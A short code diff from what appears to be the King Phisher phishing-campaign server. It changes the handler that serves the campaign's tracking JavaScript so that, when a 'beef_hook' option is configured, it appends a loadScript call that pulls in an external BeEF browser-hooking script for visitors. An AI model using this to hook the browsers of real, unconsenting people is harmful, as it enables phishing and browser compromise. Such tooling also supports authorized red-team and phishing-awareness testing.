@@ -337,7 +337,9 @@ class KingPhisherRequestHandler(rpcmixin.KingPhisherRequestHandlerRPCMixin, Adva
 		if not kp_hook_js:
 			self.respond_not_found()
 			return
-		file_h = open(kp_hook_js)
+		javascript = open(kp_hook_js).read()
+		if self.config.has_option('beef_hook'):
+			javascript += "\nloadScript('{0}');\n\n".format(self.config.get('beef_hook'))
 		self.send_response(200)
 		self.send_header('Content-Type', 'text/javascript')
 		self.send_header('Pragma', 'no-cache')
@@ -345,10 +347,9 @@ class KingPhisherRequestHandler(rpcmixin.KingPhisherRequestHandlerRPCMixin, Adva
 		self.send_header('Expires', '0')
 		self.send_header('Access-Control-Allow-Origin', '*')
 		self.send_header('Access-Control-Allow-Methods', 'POST, GET')
-		fs = os.fstat(file_h.fileno())
-		self.send_header('Content-Length', str(fs[6]))
+		self.send_header('Content-Length', str(len(javascript)))
 		self.end_headers()
-		shutil.copyfileobj(file_h, self.wfile)
+		self.wfile.write(javascript)
 		return
 
 	def handle_page_visit(self):
